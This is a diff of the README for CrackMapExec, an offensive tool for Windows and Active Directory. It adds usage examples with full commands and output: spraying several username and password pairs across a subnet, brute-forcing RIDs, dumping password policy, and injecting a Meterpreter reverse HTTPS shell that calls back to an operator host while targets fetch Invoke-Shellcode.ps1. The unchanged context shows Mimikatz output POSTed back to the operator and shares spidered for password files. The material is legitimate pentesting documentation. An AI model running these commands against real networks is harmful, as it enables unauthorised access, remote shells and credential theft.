@@ -4,7 +4,7 @@ A swiss army knife for pentesting Windows/Active Directory environments
 Powered by [Impacket](https://github.com/CoreSecurity/impacket)
 
 This project was inspired by/based off of:
-- @agsolino's [wmiexec.py](https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py), [wmiquery.py](https://github.com/CoreSecurity/impacket/blob/master/examples/wmiquery.py), [smbexec.py](https://github.com/CoreSecurity/impacket/blob/master/examples/smbexec.py), [samrdump.py](https://github.com/CoreSecurity/impacket/blob/master/examples/samrdump.py), [secretsdump.py](https://github.com/CoreSecurity/impacket/blob/master/examples/secretsdump.py) and [atexec.py](https://github.com/CoreSecurity/impacket/blob/master/examples/atexec.py) scripts (beyond awesome)
+- @agsolino's [wmiexec.py](https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py), [wmiquery.py](https://github.com/CoreSecurity/impacket/blob/master/examples/wmiquery.py), [smbexec.py](https://github.com/CoreSecurity/impacket/blob/master/examples/smbexec.py), [samrdump.py](https://github.com/CoreSecurity/impacket/blob/master/examples/samrdump.py), [secretsdump.py](https://github.com/CoreSecurity/impacket/blob/master/examples/secretsdump.py), [atexec.py](https://github.com/CoreSecurity/impacket/blob/master/examples/atexec.py) and [lookupsid.py](https://github.com/CoreSecurity/impacket/blob/master/examples/lookupsid.py) scripts (beyond awesome)
 - @ShawnDEvans's [smbmap](https://github.com/ShawnDEvans/smbmap)
 - @gojhonny's [CredCrack](https://github.com/gojhonny/CredCrack)
 - @pentestgeek's [smbexec](https://github.com/pentestgeek/smbexec)
@@ -78,8 +78,12 @@ Mapping/Enumeration:
   Options for Mapping/Enumerating
 
   --shares              List shares
+  --check-uac           Checks UAC status
   --sessions            Enumerate active sessions
+  --disks               Enumerate disks
   --users               Enumerate users
+  --rid-brute MAX_RID   Enumerate users by bruteforcing RID's
+  --pass-pol            Dump password policy
   --lusers              Enumerate logged on users
   --wmi QUERY           Issues the specified WMI query
 
@@ -97,19 +101,22 @@ Command Execution:
 
   --execm {atexec,wmi,smbexec}
                         Method to execute the command (default: smbexec)
+  --force-ps32          Force all PowerShell code/commands to run in a 32bit process
   -x COMMAND            Execute the specified command
   -X PS_COMMAND         Excute the specified powershell command
 
-Shellcode/EXE/DLL injection:
-  Options for injecting Shellcode/EXE/DLL's in memory using PowerShell
+Shellcode/EXE/DLL/Meterpreter Injection:
+  Options for injecting Shellcode/EXE/DLL/Meterpreter in memory using PowerShell
 
-  --inject {exe,shellcode,dll}
-                        Inject Shellcode, EXE or a DLL
-  --path PATH           Path to the Shellcode/EXE/DLL you want to inject on the target systems
-  --procid PROCID       Process ID to inject the Shellcode/EXE/DLL into (if omitted, will inject within the running PowerShell process)
+  --inject {met_reverse_http,met_reverse_https,exe,shellcode,dll}
+                        Inject Shellcode, EXE, DLL or Meterpreter
+  --path PATH           Path to the Shellcode/EXE/DLL you want to inject on the target systems (ignored if injecting Meterpreter)
+  --procid PROCID       Process ID to inject the Shellcode/EXE/DLL/Meterpreter into (if omitted, will inject within the running PowerShell process)
   --exeargs EXEARGS     Arguments to pass to the EXE being reflectively loaded (ignored if not injecting an EXE)
+  --met-options LHOST LPORT
+                        Meterpreter options (ignored if not injecting Meterpreter)
 
-Filesystem interaction:
+Filesystem Interaction:
   Options for interacting with filesystems
 
   --list PATH           List contents of a directory
@@ -140,6 +147,19 @@ Quick credential validation:
 [+] 172.16.206.132:445 Login successful 'DRUGCOMPANY-PC\username:password'
 [+] 172.16.206.133:445 Login successful 'DRUGOUTCOVE-PC\username:password'
 [+] 172.16.206.130:445 Login successful 'DESKTOP-QDVNP6B\username:password'
+```
+
+Specify multiple user/pass combinations from the command line or a file:
+```
+#~ python crackmapexec.py -t 100 172.16.206.0/24 -u username1,username2 -p password1,password2
+[*] 192.168.2.5:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
+[*] 192.168.2.6:445 is running Windows 6.3 Build 9600 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
+[-] 192.168.2.5:445 'DRUGCOMPANY-PC\username1:password1' SMB SessionError: STATUS_LOGON_FAILURE ...
+[-] 192.168.2.5:445 'DRUGCOMPANY-PC\username2:password1' SMB SessionError: STATUS_LOGON_FAILURE ...
+[+] 192.168.2.5:445 Login successful 'HRBOX\username1:password2'
+[-] 192.168.2.6:445 'DESKTOP-QDVNP6B\username2:password1' SMB SessionError: STATUS_LOGON_FAILURE ...
+[-] 192.168.2.6:445 'DESKTOP-QDVNP6B\username1:password1' SMB SessionError: STATUS_LOGON_FAILURE ...
+[+] 192.168.2.6:445 Login successful 'DESKTOP-QDVNP6B\username1:password2'
 ```
 
 Let's enumerate available shares:
@@ -239,7 +259,7 @@ Mimikatz's output then gets POST'ed back to our HTTP server, saved to a log file
 [*] 172.16.206.132 Saved POST data to Mimikatz-172.16.206.132-2015-08-19_18:57:48.log
 ``` 
 
-Lets Spider the C$ share starting from the ```Users``` folder for the pattern ```password``` in all files and directories (concurrently):
+Lets spider the C$ share starting from the ```Users``` folder for the pattern ```password``` in all files and directories (concurrently):
 ```
 #~ python crackmapexec.py -t 150 172.16.206.0/24 -u username -p password --spider Users --depth 10 --pattern password
 [*] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
@@ -260,6 +280,21 @@ Lets Spider the C$ share starting from the ```Users``` folder for the pattern ``
 //172.16.206.130/Users/drugdealer/AppData/Roaming/Microsoft/Windows/Recent/superpasswords.txt.lnk
 //172.16.206.130/Users/drugdealer/Desktop/superpasswords.txt.txt
 [+] 172.16.206.130:445 DESKTOP-QDVNP6B Done spidering (Completed in 38.6000130177)
+```
+
+Directly inject Meterpreter into memory forcing the Powershell code to run in a 32bit process
+```
+#~ python crackmapexec.py -t 100 192.168.2.5-6 -u username -p password --force-ps32 --inject met_reverse_https --met-options 192.168.2.1 4545
+
+[*] Press CTRL-C at any time to exit
+[*] Note: This might take some time on large networks! Go grab a redbull!
+
+[*] 192.168.2.5:445 is running Windows 6.1 Build 7601 (name:HRBOX) (domain:HRBOX)
+[*] 192.168.2.6:445 is running Windows 6.3 Build 9600 (name:AVERAGEJOEBOX) (domain:AVERAGEJOEBOX)
+[+] 192.168.2.5:445 Login successful 'HRBOX\username:password'
+[+] 192.168.2.6:445 Login successful 'AVERAGEJOEBOX\username:password'
+192.168.2.6 - - [08/Oct/2015 12:50:56] "GET /Invoke-Shellcode.ps1 HTTP/1.1" 200 -
+192.168.2.5 - - [08/Oct/2015 12:50:58] "GET /Invoke-Shellcode.ps1 HTTP/1.1" 200 -
 ```
 
 #To do
